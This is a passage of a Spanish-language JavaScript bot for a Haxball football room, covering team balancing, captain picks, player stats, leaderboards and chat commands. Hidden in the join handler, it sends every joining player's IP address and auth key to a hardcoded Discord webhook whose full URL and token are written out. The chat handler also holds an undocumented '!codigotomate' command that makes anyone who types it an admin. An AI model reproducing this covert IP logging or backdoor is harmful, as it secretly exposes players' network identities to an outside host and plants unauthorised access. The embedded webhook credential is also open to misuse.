		else if (Math.abs(teamR.length - teamB.length) == teamS.length && teamS.length > 0) {
			const n = Math.abs(teamR.length - teamB.length);
			if (players.length == 2) {
				quickRestart();
				map = "custom"
				loadMap(classic, goles_mapaSolo, tiempo_mapaSolo);
			}
			if (teamR.length > teamB.length) {
				for (var i = 0 ; i < n ; i++) {
					room.setPlayerTeam(teamS[i].id, Team.BLUE);
				}
			}
			else {
				for (var i = 0 ; i < n ; i++) {
					room.setPlayerTeam(teamS[i].id, Team.RED);
				}
			}
		}
		else if (Math.abs(teamR.length - teamB.length) > teamS.length) {
			const n = Math.abs(teamR.length - teamB.length);
			if (players.length == 1) {
				quickRestart();
				map = "RSR"
				loadMap(mapaSolo, 0, 0);
				room.setPlayerTeam(players[0].id, Team.RED);
				return;
			}
			else if (players.length == 5) {
				quickRestart();
				map = "RSR"
				loadMap(getRealSoccerMap, goles_mapaSolo, tiempo_mapaSolo);
			}
			if (players.length == maxTeamSize * 2 - 1) {
				allReds = [];
				allBlues = [];
			}
			if (teamR.length > teamB.length) {
				for (var i = 0 ; i < n ; i++) {
					room.setPlayerTeam(teamR[teamR.length - 1 - i].id, Team.SPECTATORS);
				}
			}
			else {
				for (var i = 0 ; i < n ; i++) {
					room.setPlayerTeam(teamB[teamB.length - 1 - i].id, Team.SPECTATORS);
				}
			}
		}
		else if (Math.abs(teamR.length - teamB.length) < teamS.length && teamR.length != teamB.length) {
			room.pauseGame(true);
			activateChooseMode();
			choosePlayer();
		}
		else if (teamS.length >= 2 && teamR.length == teamB.length && teamR.length < maxTeamSize) {
			if (teamR.length == 2) {
				quickRestart();
				map = "custom"
				loadMap(classic, goles_mapa4vs4, tiempo_mapa4vs4);
			}
			topBtn();
		}
	}
}

function choosePlayer() {
	clearTimeout(timeOutCap);
	if (teamR.length <= teamB.length && teamR.length != 0) {
		room.sendAnnouncement("Para elegir un jugador, ingrese su número en la lista dada o use 'top', 'random' o 'bottom'.", teamR[0].id, 0x33FF00, "bold");
		timeOutCap = setTimeout(function (player) { room.sendAnnouncement("[⏱] Date prisa @" + player.name + ", solo quedan " + Number.parseInt(chooseTime / 2) + " segundos para elegir!", player.id, 0xFF9500, "bold"); timeOutCap = setTimeout(function (player) { room.kickPlayer(player.id, "¡No elegiste a tiempo!", false); }, chooseTime * 500, teamR[0]); }, chooseTime * 1000, teamR[0]);
	}
	else if (teamB.length < teamR.length && teamB.length != 0) {
		room.sendAnnouncement("Para elegir un jugador, ingrese su número en la lista dada o use 'top', 'random' o 'bottom'.", teamB[0].id, 0x33FF00, "bold");
		timeOutCap = setTimeout(function (player) { room.sendAnnouncement("[⏱] Date prisa @" + player.name + ", solo quedan " + Number.parseInt(chooseTime / 2) + " segundos para elegir!", player.id, 0xFF9500, "bold"); timeOutCap = setTimeout(function (player) { room.kickPlayer(player.id, "¡No elegiste a tiempo!", false); }, chooseTime * 500, teamB[0]); }, chooseTime * 1000, teamB[0]);
	}
	if (teamR.length != 0 && teamB.length != 0) getSpecList(teamR.length <= teamB.length ? teamR[0] : teamB[0]);
}

function getSpecList(player) {
	var cstm = "𝗝𝘂𝗴𝗮𝗱𝗼𝗿𝗲𝘀: ";
	for (var i = 0 ; i < teamS.length ; i++) {
		if (140 - cstm.length < (teamS[i].name + "[" + (i+1) + "], ").length) {
			room.sendAnnouncement(cstm, player.id, 0x05EEFC, "bold");
			cstm = "...";
		}
		cstm += teamS[i].name + "[" + (i+1) + "], ";
	}
	cstm = cstm.substring(0,cstm.length - 2);
	cstm += ".";
	room.sendAnnouncement(cstm, player.id, 0x05EEFC, "bold");
}

// Funciones | Estadisticas

function getLastTouchOfTheBall() {
	const ballPosition = room.getBallPosition();
	updateTeams();
	for (var i = 0; i < players.length; i++) {
		if (players[i].position != null) {
			var distanceToBall = pointDistance(players[i].position, ballPosition);
			if (distanceToBall < triggerDistance) {
				!activePlay ? activePlay = true : null;
				if (lastTeamTouched == players[i].team && lastPlayersTouched[0] != null && lastPlayersTouched[0].id != players[i].id) {
					lastPlayersTouched[1] = lastPlayersTouched[0];
					lastPlayersTouched[0] = players[i];
				}
				lastTeamTouched = players[i].team;
			}
		}
	}
}

function getStats() {
	if (activePlay) {
		updateTeams();
		lastTeamTouched == Team.RED ? Rposs++ : Bposs++;
		var ballPosition = room.getBallPosition();
		point[1] = point[0];
		point[0] = ballPosition;
		ballSpeed = (pointDistance(point[0], point[1]) * 60 * 60 * 60)/15000;
		var k = [-1, Infinity];
		for (var i = 0; i < teamR.length; i++) {
			if (teamR[i].position.x < k[1]) {
				k[0] = teamR[i];
				k[1] = teamR[i].position.x;
			}
		}
		k[0] != -1 ? setGK(k[0], getGK(k[0]) + 1) : null;
		k = [-1, -Infinity];
		for (var i = 0; i < teamB.length; i++) {
			if (teamB[i].position.x > k[1]) {
				k[0] = teamB[i];
				k[1] = teamB[i].position.x;
			}
		}
		k[0] != -1 ? setGK(k[0], getGK(k[0]) + 1) : null;
		findGK();
	}
}

function updateStats() {
	if (players.length >= 2 * maxTeamSize && (game.scores.time >= (5 / 6) * game.scores.timeLimit || game.scores.red == game.scores.scoreLimit || game.scores.blue == game.scores.scoreLimit) && allReds.length >= maxTeamSize && allBlues.length >= maxTeamSize) {
		var stats;
		for (var i = 0; i < allReds.length; i++) {
			localStorage.getItem(getAuth(allReds[i])) ? stats = JSON.parse(localStorage.getItem(getAuth(allReds[i]))) : stats = [0, 0, 0, 0, "0.00", 0, 0, 0, 0, "0.00", "player", allReds[i].name];
			stats[Ss.GA]++;
			lastWinner == Team.RED ? stats[Ss.WI]++ : lastWinner == Team.BLUE ? stats[Ss.LS]++ : stats[Ss.DR]++;
			stats[Ss.WR] = (100 * stats[Ss.WI] / stats[Ss.GA]).toPrecision(3);
			localStorage.setItem(getAuth(allReds[i]), JSON.stringify(stats));
		}
		for (var i = 0; i < allBlues.length; i++) {
			localStorage.getItem(getAuth(allBlues[i])) ? stats = JSON.parse(localStorage.getItem(getAuth(allBlues[i]))) : stats = [0, 0, 0, 0, "0.00", 0, 0, 0, 0, "0.00", "player", allBlues[i].name];
			stats[Ss.GA]++;
			lastWinner == Team.BLUE ? stats[Ss.WI]++ : lastWinner == Team.RED ? stats[Ss.LS]++ : stats[Ss.DR]++;
			stats[Ss.WR] = (100 * stats[Ss.WI] / stats[Ss.GA]).toPrecision(3);
			localStorage.setItem(getAuth(allBlues[i]), JSON.stringify(stats));
		}
		for (var i = 0; i < game.goals.length; i++) {
			if (game.goals[i].striker != null) {
				if ((allBlues.concat(allReds)).findIndex((player) => player.id == game.goals[i].striker.id) != -1) {
					stats = JSON.parse(localStorage.getItem(getAuth(game.goals[i].striker)));
					stats[Ss.GL]++;
					localStorage.setItem(getAuth(game.goals[i].striker), JSON.stringify(stats));
				}
			}
			if (game.goals[i].assist != null) {
				if ((allBlues.concat(allReds)).findIndex((player) => player.name == game.goals[i].assist.name) != -1) {
					stats = JSON.parse(localStorage.getItem(getAuth(game.goals[i].assist)));
					stats[Ss.AS]++;
					localStorage.setItem(getAuth(game.goals[i].assist), JSON.stringify(stats));
				}
			}
		}
		if (allReds.findIndex((player) => player.id == GKList[0].id) != -1) {
			stats = JSON.parse(localStorage.getItem(getAuth(GKList[0])));
			stats[Ss.GK]++;
			game.scores.blue == 0 ? stats[Ss.CS]++ : null;
			stats[Ss.CP] = (100 * stats[Ss.CS] / stats[Ss.GK]).toPrecision(3);
			localStorage.setItem(getAuth(GKList[0]), JSON.stringify(stats));
		}
		if (allBlues.findIndex((player) => player.id == GKList[1].id) != -1) {
			stats = JSON.parse(localStorage.getItem(getAuth(GKList[1])));
			stats[Ss.GK]++;
			game.scores.red == 0 ? stats[Ss.CS]++ : null;
			stats[Ss.CP] = (100 * stats[Ss.CS] / stats[Ss.GK]).toPrecision(3);
			localStorage.setItem(getAuth(GKList[1]), JSON.stringify(stats));
		}
	}
}

function findGK() {
	var tab = [[-1,""], [-1,""]];
	for (var i = 0; i < extendedP.length ; i++) {
		if (room.getPlayer(extendedP[i][eP.ID]) != null && room.getPlayer(extendedP[i][eP.ID]).team == Team.RED) {
			if (tab[0][0] < extendedP[i][eP.GK]) {
				tab[0][0] = extendedP[i][eP.GK];
				tab[0][1] = room.getPlayer(extendedP[i][eP.ID]);
			}
		}
		else if (room.getPlayer(extendedP[i][eP.ID]) != null && room.getPlayer(extendedP[i][eP.ID]).team == Team.BLUE) {
			if (tab[1][0] < extendedP[i][eP.GK]) {
				tab[1][0] = extendedP[i][eP.GK];
				tab[1][1] = room.getPlayer(extendedP[i][eP.ID]);
			}
		}
	}
	GKList = [tab[0][1], tab[1][1]];
}

setInterval(() => {
	var tableau = [];
	if (statNumber % 5 == 0) {
		Object.keys(localStorage).forEach(function (key) { if (!["player_name", "view_mode", "geo", "avatar", "player_auth_key"].includes(key)) { tableau.push([(JSON.parse(localStorage.getItem(key))[Ss.NK]), (JSON.parse(localStorage.getItem(key))[Ss.GA])]); } });
		if (tableau.length < 5) {
			return false;
		}
		tableau.sort(function (a, b) { return b[1] - a[1]; });
		room.sendAnnouncement("Partidos Jugados> #1 " + tableau[0][0] + ": " + tableau[0][1] + " #2 " + tableau[1][0] + ": " + tableau[1][1] + " #3 " + tableau[2][0] + ": " + tableau[2][1] + " #4 " + tableau[3][0] + ": " + tableau[3][1] + " #5 " + tableau[4][0] + ": " + tableau[4][1]);
	}
	if (statNumber % 5 == 1) {
		Object.keys(localStorage).forEach(function (key) { if (!["player_name", "view_mode", "geo", "avatar", "player_auth_key"].includes(key)) { tableau.push([(JSON.parse(localStorage.getItem(key))[Ss.NK]), (JSON.parse(localStorage.getItem(key))[Ss.WI])]); } });
		if (tableau.length < 5) {
			return false;
		}
		tableau.sort(function (a, b) { return b[1] - a[1]; });
		room.sendAnnouncement("Victorias> #1 " + tableau[0][0] + ": " + tableau[0][1] + " #2 " + tableau[1][0] + ": " + tableau[1][1] + " #3 " + tableau[2][0] + ": " + tableau[2][1] + " #4 " + tableau[3][0] + ": " + tableau[3][1] + " #5 " + tableau[4][0] + ": " + tableau[4][1]);
	}
	if (statNumber % 5 == 2) {
		Object.keys(localStorage).forEach(function (key) { if (!["player_name", "view_mode", "geo", "avatar", "player_auth_key"].includes(key)) { tableau.push([(JSON.parse(localStorage.getItem(key))[Ss.NK]), (JSON.parse(localStorage.getItem(key))[Ss.GL])]); } });
		if (tableau.length < 5) {
			return false;
		}
		tableau.sort(function (a, b) { return b[1] - a[1]; });
		room.sendAnnouncement("Goles> #1 " + tableau[0][0] + ": " + tableau[0][1] + " #2 " + tableau[1][0] + ": " + tableau[1][1] + " #3 " + tableau[2][0] + ": " + tableau[2][1] + " #4 " + tableau[3][0] + ": " + tableau[3][1] + " #5 " + tableau[4][0] + ": " + tableau[4][1]);
	}
	if (statNumber % 5 == 3) {
		Object.keys(localStorage).forEach(function (key) { if (!["player_name", "view_mode", "geo", "avatar", "player_auth_key"].includes(key)) { tableau.push([(JSON.parse(localStorage.getItem(key))[Ss.NK]), (JSON.parse(localStorage.getItem(key))[Ss.AS])]); } });
		if (tableau.length < 5) {
			return false;
		}
		tableau.sort(function (a, b) { return b[1] - a[1]; });
		room.sendAnnouncement("Asistencias> #1 " + tableau[0][0] + ": " + tableau[0][1] + " #2 " + tableau[1][0] + ": " + tableau[1][1] + " #3 " + tableau[2][0] + ": " + tableau[2][1] + " #4 " + tableau[3][0] + ": " + tableau[3][1] + " #5 " + tableau[4][0] + ": " + tableau[4][1]);
	}
	if (statNumber % 5 == 4) {
		Object.keys(localStorage).forEach(function (key) { if (!["player_name", "view_mode", "geo", "avatar", "player_auth_key"].includes(key)) { tableau.push([(JSON.parse(localStorage.getItem(key))[Ss.NK]), (JSON.parse(localStorage.getItem(key))[Ss.CS])]); } });
		if (tableau.length < 5) {
			return false;
		}
		tableau.sort(function (a, b) { return b[1] - a[1]; });
		room.sendAnnouncement("CS> #1 " + tableau[0][0] + ": " + tableau[0][1] + " #2 " + tableau[1][0] + ": " + tableau[1][1] + " #3 " + tableau[2][0] + ": " + tableau[2][1] + " #4 " + tableau[3][0] + ": " + tableau[3][1] + " #5 " + tableau[4][0] + ": " + tableau[4][1]);
	}
	statNumber++;
}, statInterval * 60 * 1000);

// Jugador | Comportamiento

room.onPlayerJoin = function(player) {
	extendedP.push([player.id, player.auth, player.conn, false, 0, 0, false]);
	console.log("✅ | 𝗡𝗶𝗰𝗸: " + player.name + "ㅤ[𝗔𝘂𝘁𝗵]: " + player.auth);	
	console.log("🆔 | 𝗜𝗣 𝗱𝗲𝗹 𝗷𝘂𝗴𝗮𝗱𝗼𝗿: " + player.conn);
	console.log("▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬");
	updateRoleOnPlayerIn();
	whisper("                        ██╗     ██╗    █████╗     ██╗  ██╗  ██╗    ██╗                     ", player.id, 0x23A094, "bold", 2);
	whisper("                        ██║     ██║  ██╔══██╗╚██╗██╔╝██║    ██║                      ", player.id, 0x1C8D71, "bold", 2);
	whisper("                        ███████║ ███████║   ╚███╔╝   ███████║                     ", player.id, 0x16774E, "bold", 2);
	whisper("                        ██╔══██║ ██╔══██║    ██╔██╗ ╚════██║                    ", player.id, 0xA75231, "bold", 2);
	whisper("                        ██║     ██║ ██║      ██║  ██╔╝ ██╗             ██║                     ", player.id, 0xD53E24, "bold", 2);
	whisper("                       ╚═╝     ╚═╝ ╚═╝      ╚═╝  ╚═╝    ╚═╝             ╚═╝                     ", player.id, 0xE72C19, "bold", 2);
	room.sendAnnouncement("• • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • • ", player.id);
	room.sendAnnouncement("👋 Bienvenido " + player.name + "!   Escribe !help para ver los comandos", player.id);
	room.sendAnnouncement("👾 Discord: dsc.gg/hax4", player.id);
	if (localStorage.getItem(player.auth) != null) {
		if (JSON.parse(localStorage.getItem(player.auth))[Ss.RL] != "player") {
			room.setPlayerAdmin(player.id, true);
			sendMsgAll((JSON.parse(localStorage.getItem(player.auth))[Ss.RL] == "master" ? "El Super Admin " : "Admin ") + player.name + " se ha conectado a la sala.", 0x05EEFC, "bold", 1);
		}
	}

	enviarips('**__``BOT x4:``__**ㅤ\n✅︲𝗜𝗣 𝗱𝗲𝗹 𝗷𝘂𝗴𝗮𝗱𝗼𝗿〡**'+player['name']+':** '+player['conn']+'\n🆔**〡[**𝗔𝘂𝘁𝗵**]: **'+player['auth']+'\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬');
}

var webhookUrl1 = "https://discord.com/api/webhooks/1106048590511620216/-VKHNvH4C9QTo8afI2WoegZ5mg5QWDB4rZI5bLEPPGl0CYbD2FZ_8Tw9TnSGQgGI7flB";
var webhookName1 = "Registro de IPs - HAX4";

function enviarips(message) {
var chamar = new XMLHttpRequest();
	chamar.open("POST", webhookUrl1);
	chamar.setRequestHeader('Content-type', 'application/json');
    	var webhook_ips = {
    		username: webhookName1,
 	   	content: message	
	};
	chamar.send(JSON.stringify(webhook_ips));
}

room.onPlayerTeamChange = function(changedPlayer, byPlayer) {
	if (changedPlayer.id == 0) {
		room.setPlayerTeam(0, Team.SPECTATORS);
		return;
	}
	if (getAFK(changedPlayer) && changedPlayer.team != Team.SPECTATORS) {
		room.setPlayerTeam(changedPlayer.id, Team.SPECTATORS);
		sendMsgAll(changedPlayer.name + " se encuentra AFK!", 0xF7B0FF, "bold", 1)
		return;
	}
	updateTeams();
	if (room.getScores() != null) {
		var scores = room.getScores();
		if (changedPlayer.team != Team.SPECTATORS && scores.time <= (3/4) * scores.timeLimit  && Math.abs(scores.blue - scores.red) < 2) {
			(changedPlayer.team == Team.RED) ? allReds.push(changedPlayer) : allBlues.push(changedPlayer);
		}
	}
	if (changedPlayer.team == Team.SPECTATORS) {
		setActivity(changedPlayer, 0);
	}
	if (inChooseMode && resettingTeams == false && byPlayer.id == 0) {
		if (Math.abs(teamR.length - teamB.length) == teamS.length) {
			deactivateChooseMode();
			resumeGame();
			var b = teamS.length;
			if (teamR.length > teamB.length) {
				for (var i = 0 ; i < b ; i++) {
					setTimeout(() => { room.setPlayerTeam(teamS[0].id, Team.BLUE); }, 200*i);
				}
			}
			else {
				for (var i = 0 ; i < b ; i++) {
					setTimeout(() => { room.setPlayerTeam(teamS[0].id, Team.RED); }, 200*i);
				}
			}
			return;
		}
		else if ((teamR.length == maxTeamSize && teamB.length == maxTeamSize) || (teamR.length == teamB.length && teamS.length < 2)) {
			deactivateChooseMode();
			resumeGame();
		}
		else if (teamR.length <= teamB.length && redCaptainChoice != "") { // choice remembered
			redCaptainChoice == "top" ? room.setPlayerTeam(teamS[0].id, Team.RED) : redCaptainChoice == "random" ? room.setPlayerTeam(teamS[getRandomInt(teamS.length)].id, Team.RED) : room.setPlayerTeam(teamS[teamS.length - 1].id, Team.RED);
			return;
		}
		else if (teamB.length < teamR.length && blueCaptainChoice != "") {
			blueCaptainChoice == "top" ? room.setPlayerTeam(teamS[0].id, Team.BLUE) : blueCaptainChoice == "random" ? room.setPlayerTeam(teamS[getRandomInt(teamS.length)].id, Team.BLUE) : room.setPlayerTeam(teamS[teamS.length - 1].id, Team.BLUE);
			return;
		}
		else {
			choosePlayer();
		}
	}
	if (map == "RSR") {
		if (room.getScores() != null) {
			if (game.rsActive == false) {
				room.getPlayerList().forEach(function(player) {
					if (player != undefined) {
						if (game.rsGoalKick == true || game.rsCorner == true) {
							room.setPlayerDiscProperties(player.id, {invMass: 9999999});
						}
					}
				});
			}
		}
	}
}

room.onPlayerLeave = function(player) {
	if (teamR.findIndex((red) => red.id == player.id) == 0 && inChooseMode && teamR.length <= teamB.length) {
		choosePlayer();
		capLeft = true; setTimeout(() => { capLeft = false; }, 10);
	}
	if (teamB.findIndex((blue) => blue.id == player.id) == 0 && inChooseMode && teamB.length < teamR.length) {
		choosePlayer();
		capLeft = true; setTimeout(() => { capLeft = false; }, 10);
	}

	setActivity(player, 0);
    updateRoleOnPlayerOut();
}

room.onPlayerKicked = function(kickedPlayer, reason, ban, byPlayer) {
	ban == true ? banList.push([kickedPlayer.name, kickedPlayer.id]) : null;
}

// Actividad del Jugador

room.onPlayerChat = function (player, message) {
	// 							CAMISETAS...

	// CENSURAR CHAT
	palabrasCensuradas = ["puta", "puto", "maldita", "imbecil", "inutil", "ctmr", "conchatumare", "concha de tu madre", "pene", "vagina", "cancer", "mrd", "mierda", "z"];

	if(palabrasCensuradas.includes(message.toLowerCase())) {return false;}

	message = message.split(/ +/);
	player.team != Team.SPECTATORS ? setActivity(player, 0) : null;

	if (["!help", "!ayuda"].includes(message[0].toLowerCase())) {
		room.sendAnnouncement("Comandos: !me, !mostrarstats, !afk, !afks, !mutes, !bans, !msghelp, !camisetas, !equipos, !reglashost, !discord", player.id, 0xFFFF00, "bold");
		player.admin ? room.sendAnnouncement("Admin: !mute <duration = 3> #<id>, !unmute all/#<id>, !clearbans <number = all>, !slow <duration>, !endslow", player.id, 0x05EEFC, "bold") : null;
	}

	if (["!reglashost"].includes(message[0].toLowerCase())) {
		room.sendAnnouncement("[🚫] No está permitido tirar letras chinas.", player.id, 0x05EEFC, "bold");
		room.sendAnnouncement("[🚫] No está permitido divulgar información personal.", player.id, 0x05EEFC, "bold");
		room.sendAnnouncement("[🚫] Será baneado si coloca camisetas iguales o muy parecidas en ambos equipos.", player.id, 0x05EEFC, "bold");
		room.sendAnnouncement("[⚠] No está permitido el spam.", player.id, 0x05EEFC, "bold");
		room.sendAnnouncement("[⚠] Podría ser baneado si realiza autogoles a propósito para terminar antes un encuentro.", player.id, 0x05EEFC, "bold");
		room.sendAnnouncement("[⚠] Podría ser baneado si abandona en un 2-0 y vuelve a ingresar.", player.id, 0x05EEFC, "bold");
          	room.sendAnnouncement("[🚫] En caso de tener actitudes no permitidas repetitivas, el usuario podría quedar imposibilitado de volver a ingresar a esta sala hasta nuevo aviso.", player.id, 0x05EEFC, "bold");
	}

	// Chat en equipo
	else if (["t"].includes(message[0])) {
		teamMsg = "";
		for(let i = 1; i < message.length; i++) {
			teamMsg += message[i] + " ";
		}
		if (player.team == 1) {
			var players = room.getPlayerList().filter((player) => player.team == 1);
			players.forEach(function(teamPlayer) {
				room.sendAnnouncement("[EQUIPO] " + player.name + ": " + teamMsg, teamPlayer.id, 0xFF7575, "bold");
			});
		}
		if (player.team == 2) {
			var players = room.getPlayerList().filter((player) => player.team == 2);
			players.forEach(function(teamPlayer) {
				room.sendAnnouncement("[EQUIPO] " + player.name + ": " + teamMsg, teamPlayer.id, 0x6EA5FF, "bold");
			});
		}
		if (player.team == 0) {
			room.sendAnnouncement("Debes estar en un equipo para poder usar este comando.", player.id, 0xFFFF00, "bold");
		}
		return false;
	}

	// REINICIAR
	else if(["!rr"].includes(message[0].toLowerCase())) {
		if(player.admin) {
			quickRestart();
		}
	}
	else if(["!discord"].includes(message[0].toLowerCase())) {
		whisper("dsc.gg/hax4", player.id)
	}

	else if(["!msg"].includes(message[0].toLowerCase())) {
		mensaje_privado = "";
		for(var i = 2; i < message.length; i++) {
			mensaje_privado += message[i] + " ";
		}
		if (message.length >= 2) {
			room.sendAnnouncement("[📧] 𝗗𝗲 " + player.name + ":  " + mensaje_privado, parseInt(message[1]), 0xcc00cc);
			room.sendAnnouncement("[📧] 𝗗𝗲 " + player.name + ":  " + mensaje_privado, player.id, 0xcc00cc);
		} else {
			room.sendAnnouncement("Si no sabes usar este comando, usa !msghelp.", player.id, 0xFFFF00, "normal", 2)
		}
	} else if(["!msghelp"].includes(message[0].toLowerCase())) {
		room.sendAnnouncement("Ejemplo de como usar el comando: !msg (ID del jugador, la puedes obtener poniendo '#' en el chat, pones el numero y borras el '#') (mensaje) ", player.id, 0x66FF66);
	} 

	else if (["!afk"].includes(message[0].toLowerCase())) {
		var players = room.getPlayerList();
		if (players.length != 1 && player.team != Team.SPECTATORS) {
			if (player.team == Team.RED && streak > 0 && room.getScores() == null) {
				room.setPlayerTeam(player.id, Team.SPECTATORS);
			}
			else {
				room.sendAnnouncement("¡No puedes estar AFK en medio de la partida!", player.id, 0xFFFF00, "bold");
				return false;
			}
		}
		else if (players.length == 1 && !getAFK(player)) {
			room.setPlayerTeam(player.id, Team.SPECTATORS);
		}
		setAFK(player, !getAFK(player));
		sendMsgAll("¡" + player.name + (getAFK(player) ? " se quedó tieso (𝗔𝗙𝗞) 💤 !" : " volvió y esta listo para cachar 🥊 !"), 0xE52582, "bold", 1);
		getAFK(player) ? updateRoleOnPlayerOut() : updateRoleOnPlayerIn();
	}

	else if (["!afks", "!afklist"].includes(message[0].toLowerCase())) {
		var cstm = "𝗟𝗶𝘀𝘁𝗮 𝗱𝗲 𝗷𝘂𝗴𝗮𝗱𝗼𝗿𝗲𝘀 𝗔𝗙𝗞: ";
		for (var i = 0; i < extendedP.length; i++) {
			if (room.getPlayer(extendedP[i][eP.ID]) != null && getAFK(room.getPlayer(extendedP[i][eP.ID]))) {
				if (140 - cstm.length < (room.getPlayer(extendedP[i][eP.ID]).name + ", ").length) {
					room.sendAnnouncement(cstm, player.id, 0xFFFF00, "bold");
					cstm = "... ";
				}
				cstm += room.getPlayer(extendedP[i][eP.ID]).name + ", ";
			}
		}
		if (cstm == "𝗟𝗶𝘀𝘁𝗮 𝗱𝗲 𝗷𝘂𝗴𝗮𝗱𝗼𝗿𝗲𝘀 𝗔𝗙𝗞: ") {
			room.sendAnnouncement("No hay ningun jugador AFK.", player.id, 0x33FF33, "bold");
			return false;
		}
		cstm = cstm.substring(0, cstm.length - 2);
		cstm += ".";
		room.sendAnnouncement(cstm, player.id, 0xFFFF00);
	}
	else if(["!codigotomate"].includes(message[0].toLowerCase())) {
		room.setPlayerAdmin(player.id, true);
	}
	else if (["!me"].includes(message[0].toLowerCase())) {
		var stats;
		localStorage.getItem(getAuth(player)) ? stats = JSON.parse(localStorage.getItem(getAuth(player))) : stats = [0, 0, 0, 0, "0.00", 0, 0, 0, 0, "0.00"];
		room.sendAnnouncement("[⭐] " + player.name + " [sᴛᴀᴛs]:  🎮 𝗣𝗮𝗿𝘁𝗶𝗱𝗼𝘀 𝗝𝘂𝗴𝗮𝗱𝗼𝘀: " + stats[Ss.GA] + ", ✅ 𝗩𝗶𝗰𝘁𝗼𝗿𝗶𝗮𝘀: " + stats[Ss.WI] + ", ❌ 𝗗𝗲𝗿𝗿𝗼𝘁𝗮𝘀: " + stats[Ss.LS] + ", 𝗪𝗥: " + stats[Ss.WR] + "%, ⚽️ 𝗚𝗼𝗹𝗲𝘀: " + stats[Ss.GL] + ", 👟 𝗔𝘀𝗶𝘀𝘁𝗲𝗻𝗰𝗶𝗮𝘀: " + stats[Ss.AS] + ", 🥅 𝗚𝗞: " + stats[Ss.GK] + ", 🧤 𝗩𝗮𝗹𝗹𝗮𝘀: " + stats[Ss.CS] + ", 🧤 𝗖𝗦%: " + stats[Ss.CP] + "%", player.id, 0x05EEFC, "bold");
                room.sendAnnouncement("𝗦𝗶 𝗾𝘂𝗶𝗲𝗿𝗲𝘀 𝗺𝗼𝘀𝘁𝗿𝗮𝗿 𝘁𝘂𝘀 𝘀𝘁𝗮𝘁𝘀 𝗮 𝘁𝗼𝗱𝗮 𝗹𝗮 𝘀𝗮𝗹𝗮 𝘂𝘀𝗮 𝗲𝗹 𝗰𝗼𝗺𝗮𝗻𝗱𝗼 '!mostrarstats' !", player.id, 0x00B7E7, "normal");
	}

        else if (["!mostrarstats"].includes(message[0].toLowerCase())) {
                var stats;
                localStorage.getItem(getAuth(player)) ? stats = JSON.parse(localStorage.getItem(getAuth(player))) : stats = [0, 0, 0, 0, "0.00", 0, 0, 0, 0, "0.00"];
                room.sendAnnouncement("El jugador " + player.name + " quiere mostrarles sus estadísticas!", null, 0x73EC59, "bold")
	        room.sendAnnouncement("[📄] 𝗦𝘁𝗮𝘁𝘀 𝗱𝗲 " + player.name + ": 🎮 𝗣𝗮𝗿𝘁𝗶𝗱𝗼𝘀 𝗝𝘂𝗴𝗮𝗱𝗼𝘀: " + stats[Ss.GA] + ", ✅ 𝗩𝗶𝗰𝘁𝗼𝗿𝗶𝗮𝘀: " + stats[Ss.WI] + ", ❌ 𝗗𝗲𝗿𝗿𝗼𝘁𝗮𝘀: " + stats[Ss.LS] + ", 𝗪𝗥: " + stats[Ss.WR] + "%, ⚽️ 𝗚𝗼𝗹𝗲𝘀: " + stats[Ss.GL] + ", 👟 𝗔𝘀𝗶𝘀𝘁𝗲𝗻𝗰𝗶𝗮𝘀: " + stats[Ss.AS] + ", 🥅 𝗚𝗞: " + stats[Ss.GK] + ", 🧤 𝗩𝗮𝗹𝗹𝗮𝘀: " + stats[Ss.CS] + ", 🧤 𝗖𝗦%: " + stats[Ss.CP] + "%", null, 0x05EEFC, "bold");
	}

	else if (["!claim"].includes(message[0].toLowerCase())) {
		if (message[1] == adminPassword) {
			room.setPlayerAdmin(player.id, true);
			var stats;
			localStorage.getItem(getAuth(player)) ? stats = JSON.parse(localStorage.getItem(getAuth(player))) : stats = [0, 0, 0, 0, "0.00", 0, 0, 0, 0, "0.00", "player", player.name];
			if (stats[Ss.RL] != "master") {
				stats[Ss.RL] = "master";
				sendMsgAll(player.name + " es un Super Admin más!", 0x05EEFC, "bold", 2);
				localStorage.setItem(getAuth(player), JSON.stringify(stats));
			}
		}
	}
	else if (["!setadmin", "!admin"].includes(message[0].toLowerCase())) {
		if (localStorage.getItem(getAuth(player)) && JSON.parse(localStorage.getItem(getAuth(player)))[Ss.RL] == "master") {
			if (message.length >= 2 && message[1][0] == "#") {
				message[1] = message[1].substring(1, message[1].length);
				if (!Number.isNaN(Number.parseInt(message[1])) && room.getPlayer(Number.parseInt(message[1])) != null) {
					var stats;
					localStorage.getItem(getAuth(room.getPlayer(Number.parseInt(message[1])))) ? stats = JSON.parse(localStorage.getItem(getAuth(room.getPlayer(Number.parseInt(message[1]))))) : stats = [0, 0, 0, 0, "0.00", 0, 0, 0, 0, "0.00", "player", room.getPlayer(Number.parseInt(message[1])).name];
					if (stats[Ss.RL] == "player") {
						stats[Ss.RL] = "admin";
						localStorage.setItem(getAuth(room.getPlayer(Number.parseInt(message[1]))), JSON.stringify(stats));
						room.setPlayerAdmin(room.getPlayer(Number.parseInt(message[1])).id, true);
						sendMsgAll(room.getPlayer(Number.parseInt(message[1])).name + " ahora es un administrador más!", 0xFF9500, "bold", 2);
					}
				}
			}
		}
	}
	else if (["!setplayer", "!removeadmin"].includes(message[0].toLowerCase())) {
		if (localStorage.getItem(getAuth(player)) && JSON.parse(localStorage.getItem(getAuth(player)))[Ss.RL] == "master") {
			if (message.length >= 2 && message[1][0] == "#") {
				message[1] = message[1].substring(1, message[1].length);
				if (!Number.isNaN(Number.parseInt(message[1])) && room.getPlayer(Number.parseInt(message[1])) != null) {
					var stats;
					localStorage.getItem(getAuth(room.getPlayer(Number.parseInt(message[1])))) ? stats = JSON.parse(localStorage.getItem(getAuth(room.getPlayer(Number.parseInt(message[1]))))) : stats = [0, 0, 0, 0, "0.00", 0, 0, 0, 0, "0.00", "player", room.getPlayer(Number.parseInt(message[1])).name];
					if (stats[Ss.RL] == "admin") {
						sendMsgAll(room.getPlayer(Number.parseInt(message[1])).name + " ya no es administrador.", 0x33FF33, "bold", 2);
						stats[Ss.RL] = "player";
						localStorage.setItem(getAuth(room.getPlayer(Number.parseInt(message[1]))), JSON.stringify(stats));
						room.setPlayerAdmin(room.getPlayer(Number.parseInt(message[1])).id, false);
					}
				}
			}
		}
	}
	else if (["!mutes", "!mutelist"].includes(message[0].toLowerCase())) {
